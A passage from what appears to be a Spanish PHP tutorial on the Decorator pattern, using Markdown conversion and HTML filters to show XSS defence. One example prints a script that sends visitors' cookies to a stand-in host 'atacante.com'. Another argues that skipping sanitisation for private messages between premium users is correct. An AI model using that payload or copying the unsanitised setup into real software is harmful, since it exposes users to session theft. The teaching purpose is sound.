MarkdownFormat convierte cada elemento Markdown:
- Párrafos simples → "<p>Hola Laura,</p>"
- "**informe mensual**" → "<strong>informe mensual</strong>"
- "## Ventas Enero-Marzo" → "<h2>Ventas Enero-Marzo</h2>"
- "### Producto A" → "<h3>Producto A</h3>"
- "### Producto B" → "<h3>Producto B</h3>"
- Líneas con "-" → "<p>- Unidades vendidas: 1,200</p>"

Resultado final (sin más filtros):
"<p>Hola Laura,</p>

<p>Te envío el <strong>informe mensual</strong> de ventas:</p>

<h2>Ventas Enero-Marzo</h2>

<h3>Producto A</h3>
<p>- Unidades vendidas: 1,200</p>
<p>- Ingresos: 45,000€</p>

<h3>Producto B</h3>
<p>- Unidades vendidas: 800</p>
<p>- Ingresos: 32,000€</p>

<p>Saludos,
Carlos</p>"
```

**Salida final mostrada en la web:**
```html
<p>Hola Laura,</p>
<p>Te envío el <strong>informe mensual</strong> de ventas:</p>
<h2>Ventas Enero-Marzo</h2>
<h3>Producto A</h3>
<p>- Unidades vendidas: 1,200</p>
<p>- Ingresos: 45,000€</p>
<h3>Producto B</h3>
<p>- Unidades vendidas: 800</p>
<p>- Ingresos: 32,000€</p>
<p>Saludos, Carlos</p>
```

**Cómo se ve visualmente para Laura:**
```
Hola Laura,

Te envío el informe mensual de ventas:

[Título mediano-grande]
Ventas Enero-Marzo

[Subtítulo mediano]
Producto A
- Unidades vendidas: 1,200
- Ingresos: 45,000€

[Subtítulo mediano]
Producto B
- Unidades vendidas: 800
- Ingresos: 32,000€

Saludos, Carlos
```

**Análisis del resultado:**
- ✅ **Formato profesional:** Los títulos son grandes, la información está jerarquizada visualmente
- ✅ **Fácil de leer:** Laura puede escanear rápidamente las secciones
- ✅ **Sin filtrado agresivo:** No perdimos ningún contenido legítimo
- ⚠️ **Sin protección contra scripts:** Si Carlos (o su cuenta hackeada) escribiera `<script>`, se mantendría
- ✅ **Apropiado para el contexto:** Mensaje privado entre usuarios de máxima confianza

**Por qué esta configuración es correcta:**
En comunicación privada entre usuarios premium verificados, priorizar la experiencia sobre la seguridad extrema tiene sentido:
1. **Bajo riesgo:** Carlos y Laura son usuarios reales, pagados, verificados
2. **Privado:** Solo ellos ven el mensaje, no hay riesgo de ataque masivo
3. **Profesional:** El formato rico es necesario para informes de trabajo
4. **Confianza mutua:** Si Carlos quisiera atacar a Laura, hay formas más directas

**Riesgo residual:**
Si la cuenta de Carlos fuera hackeada, un atacante podría enviar a Laura un mensaje con `<script>`. Laura ejecutaría ese script. Para mitigarlo sin perder experiencia:
- Podrías añadir `DangerousHTMLTagsFilter` después de `MarkdownFormat`
- O confiar en que usuarios premium cuidan mejor sus cuentas
- O limitar esto solo a conversaciones entre usuarios con verificación 2FA

La decisión depende de tu análisis de riesgo vs experiencia.

### **EJEMPLO 4: comentario con filtrado total después de Markdown**

**Situación:** Quieres permitir escribir en Markdown pero mostrar solo texto plano (caso raro pero posible).

**Configuración:**
```php
$procesador = new PlainTextFilter(
    new MarkdownFormat(new TextInput())
);
```

**Entrada del usuario:**
```
# Título
Esto es **importante**
<script>alert('hack')</script>
```

**Flujo de procesamiento:**
```
PASO 1 - TextInput:
Pasa el texto sin cambios
↓
PASO 2 - MarkdownFormat convierte a HTML:
<h1>Título</h1>
<p>Esto es <strong>importante</strong></p>
<script>alert('hack')</script>
↓
PASO 3 - PlainTextFilter elimina TODO el HTML:
Título
Esto es importante
```

**Salida mostrada en la web:**
```
Título
Esto es importante
```

**Análisis:**
- ✅ Seguro: eliminó todo HTML incluido el script
- ❌ Sin formato: también eliminó el HTML que generó Markdown
- 🤔 Caso de uso raro: ¿para qué convertir a HTML si luego lo eliminas?
- 💡 Podría usarse para generar versiones en texto plano de emails

### **EJEMPLO 5: solo eliminar HTML peligroso (sin Markdown)**

**Situación:** Usuario experto escribe HTML directamente, pero quieres filtrar lo peligroso.

**Configuración:**
```php
$procesador = new DangerousHTMLTagsFilter(new TextInput());
```

**Entrada del usuario:**
```html
<div class="destacado">
  <h2>Anuncio Importante</h2>
  <p>Nueva versión disponible en <a href="https://ejemplo.com">este enlace</a></p>
  <button onclick="robarDatos()">Click aquí</button>
  <script>alert('XSS')</script>
</div>
```

**Flujo de procesamiento:**
```
PASO 1 - TextInput:
Pasa el texto sin cambios
↓
PASO 2 - DangerousHTMLTagsFilter elimina scripts y atributos peligrosos:
<div class="destacado">
  <h2>Anuncio Importante</h2>
  <p>Nueva versión disponible en <a href="https://ejemplo.com">este enlace</a></p>
  <button>Click aquí</button>
  
</div>
```

**Salida mostrada en la web:**
```html
<div class="destacado">
  <h2>Anuncio Importante</h2>
  <p>Nueva versión disponible en <a href="https://ejemplo.com">este enlace</a></p>
  <button>Click aquí</button>
</div>
```

**Análisis:**
- ✅ Mantuvo la estructura HTML compleja
- ✅ Eliminó el `<script>` malicioso
- ✅ Eliminó el `onclick` peligroso del botón
- ✅ Apropiado para usuarios de confianza que saben HTML

### **EJEMPLO 6: sin procesamiento (caso peligroso)**

**Situación:** Mostrar texto exactamente como el usuario lo escribió (⚠️ PELIGROSO).

**Configuración:**
```php
$procesador = new TextInput();
```

**Entrada del usuario:**
```html
Hola <script>
  fetch('http://atacante.com/robar?cookie=' + document.cookie)
</script>
```

**Flujo de procesamiento:**
```
PASO 1 - TextInput:
Pasa el texto sin cambios (sin ningún filtro)
```

**Salida mostrada en la web:**
```html
Hola <script>
  fetch('http://atacante.com/robar?cookie=' + document.cookie)
</script>
```

**Resultado:**
❌❌❌ **¡PELIGRO CRÍTICO!** El script se ejecuta en el navegador de quien vea el contenido.

**Cuándo usar:**
- Nunca en producción con contenido de usuarios
- Solo en áreas de administración ultra-restringidas
- Para preview de código (mostrar ejemplos de código)

---
---

## 8. El rol de cada archivo en la aplicación

### `InputFormat.php` - El contrato

**Qué es:** Una interfaz (contrato)

**Qué hace:** Define que cualquier procesador de texto debe tener un método `formatText()` que recibe texto y devuelve texto procesado.

**Por qué existe:** Para que todos los componentes (base y decoradores) "hablen el mismo idioma". Así puedes intercambiarlos y combinarlos libremente.

**Analogía:** Es como un enchufe estándar. No importa qué aparato conectes (lámpara, ventilador, cargador), todos tienen el mismo tipo de enchufe y funcionan con el mismo sistema eléctrico.

### `TextInput.php` - El punto de partida

**Qué es:** El componente base concreto

**Qué hace:** Absolutamente nada. Devuelve el texto exactamente como lo recibe.

**Por qué existe:** Es el "lienzo en blanco" sobre el que se aplican las transformaciones. Es el punto de partida de cualquier cadena de procesamiento.

**En la práctica:** Cuando el usuario envía su texto, primero entra a través de un `TextInput`, que simplemente lo pasa adelante sin modificarlo. Luego los decoradores hacen su trabajo sobre ese texto.

**Por qué no empezar directamente con un decorador:** Porque necesitas un objeto base que implemente la interfaz. Los decoradores necesitan "envolver" algo, y ese algo es `TextInput`.

### `TextFormat.php` - La base para los decoradores

**Qué es:** Una clase abstracta (no se puede instanciar directamente)

**Qué hace:** Proporciona la estructura común que todos los decoradores necesitan:
- Guarda una referencia al objeto que está decorando
- Tiene un constructor que recibe ese objeto
- Tiene un método `formatText()` que por defecto solo delega al objeto envuelto

**Por qué existe:** Para evitar repetir el mismo código en cada decorador. Sin esta clase, cada decorador tendría que escribir manualmente el código para guardar y delegar al objeto envuelto.

**Funcionamiento interno:**
```php
// Cuando creas:
$decorador = new PlainTextFilter($textInput);

// Internamente:
// 1. PlainTextFilter hereda de TextFormat
// 2. TextFormat guarda $textInput en $this->inputFormat
// 3. Cuando llamas a $decorador->formatText($texto):
//    - PlainTextFilter llama a parent::formatText($texto)
//    - Eso ejecuta TextFormat::formatText() que llama a $this->inputFormat->formatText()
//    - PlainTextFilter toma ese resultado y le aplica strip_tags()
```

### `PlainTextFilter.php` - Seguridad Máxima

**Qué es:** Un decorador concreto

**Qué hace:** Elimina TODAS las etiquetas HTML del texto usando `strip_tags()`

**Cuándo se usa:** En secciones donde la seguridad es crítica y no necesitas ningún formato (comentarios públicos, valoraciones, etc.)

**Ejemplo real:**
```
Entrada: "Hola <b>amigo</b> <script>alert('XSS')</script>"
Salida:  "Hola amigo "
```

**Responsabilidad:** Filtrado de seguridad extremo. Solo esta clase sabe cómo eliminar HTML. Ninguna otra clase necesita saberlo.

### `DangerousHTMLTagsFilter.php` - Seguridad Selectiva

**Qué es:** Un decorador concreto

**Qué hace:** Elimina solo las partes peligrosas del HTML:
- Tags `<script>` completos
- Atributos que ejecutan JavaScript (`onclick`, `onload`, etc.)
- Mantiene HTML inofensivo (`<b>`, `<i>`, `<p>`, `<a>` sin eventos)

**Cuándo se usa:** En secciones donde quieres permitir formato básico pero mantener la seguridad (posts de foro, artículos de blog)

**Ejemplo real:**
```
Entrada: "Esto es <b>importante</b> <script>hack()</script> <a onclick='robar()'>link</a>"
Salida:  "Esto es <b>importante</b>  <a>link</a>"
```

**Responsabilidad:** Balance entre seguridad y experiencia de usuario. Es más inteligente que `PlainTextFilter` porque diferencia HTML bueno de HTML malo.

### `MarkdownFormat.php` - Transformación de Formato

**Qué es:** Un decorador concreto

**Qué hace:** Convierte sintaxis Markdown a HTML:
- `# Título` → `<h1>Título</h1>`
- `**negrita**` → `<strong>negrita</strong>`
- `*cursiva*` → `<em>cursiva</em>`
- Párrafos → `<p>...</p>`

**Cuándo se usa:** En secciones donde permites a los usuarios escribir en Markdown (más fácil y seguro que HTML crudo)

**Ejemplo real:**
```
Entrada: "# Hola\n\nEsto es **importante**"
Salida:  "<h1>Hola</h1>\n\n<p>Esto es <strong>importante</strong></p>"
```

**Responsabilidad:** Transformación de formato. Convierte un lenguaje de marcado simple (Markdown) a HTML. Esta clase no se preocupa por la seguridad, solo por la conversión.

**Importante:** Este decorador GENERA HTML, por eso típicamente se combina con un filtro de seguridad que se aplica DESPUÉS.

### `index.php` - El cliente (la aplicación real)

**Qué es:** El código que usa el sistema de formateo

**Qué hace:** 
1. Define diferentes escenarios (comentario peligroso, post de foro)
2. Crea diferentes configuraciones de decoradores según el escenario
3. Procesa texto con esas configuraciones
4. Muestra los resultados

**Por qué existe:** Representa el código real de tu sitio web que:
- Recibe contenido del usuario (formularios)
- Decide qué procesamiento aplicar según la sección del sitio
- Procesa el contenido
- Lo guarda en la base de datos o lo muestra

**Función `displayCommentAsAWebsite()`:**
Es una función auxiliar que simula cómo tu sitio web renderiza el contenido. En la realidad sería tu template/vista que muestra el contenido en HTML.

---
---

## 9. Ventajas de aplicar el patrón Decorator

### Ventaja 1: Facilidad para Añadir Nuevas Reglas

Mañana decides permitir BBCode (`[b]texto[/b]`). Solo necesitas:

```php
class BBCodeFormat extends TextFormat {
    public function formatText($text) {
        $text = parent::formatText($text);
        $text = str_replace('[b]', '<strong>', $text);
        $text = str_replace('[/b]', '</strong>', $text);
        // ... más conversiones
        return $text;
    }
}
```

Y automáticamente puedes combinarlo con los filtros existentes:
```php
$procesador = new DangerousHTMLTagsFilter(
    new BBCodeFormat(new TextInput())
);
```

**No modificas ningún archivo existente.** Solo añades uno nuevo.

---

### Ventaja 2: Configuraciones Personalizadas por Usuario

Imagina que quieres ofrecer a usuarios premium la opción de elegir su nivel de filtrado:

```php
// Según las preferencias del usuario
switch ($user->filter_preference) {
    case 'strict':
        $procesador = new PlainTextFilter(new TextInput());
        break;
    case 'balanced':
        $procesador = new DangerousHTMLTagsFilter(
            new MarkdownFormat(new TextInput())
        );
        break;
    case 'permissive':
        $procesador = new MarkdownFormat(new TextInput());
        break;
}
```

El sistema es lo suficientemente flexible para esto sin cambiar nada del código base.

---

### Ventaja 3: Testing Independiente

Puedes testear cada pieza por separado:

```php
// Test 1: ¿MarkdownFormat convierte correctamente?
$markdown = new MarkdownFormat(new TextInput());
$resultado = $markdown->formatText("**negrita**");
assert($resultado === "<p><strong>negrita</strong></p>");

// Test 2: ¿PlainTextFilter elimina todo el HTML?
$filter = new PlainTextFilter(new TextInput());
$resultado = $filter->formatText("<b>hola</b>");
assert($resultado === "hola");

// Test 3: ¿La combinación funciona?
$combo = new PlainTextFilter(new MarkdownFormat(new TextInput()));
$resultado = $combo->formatText("**negrita**");
assert($resultado === "negrita"); // Markdown convierte a HTML, luego se elimina
```
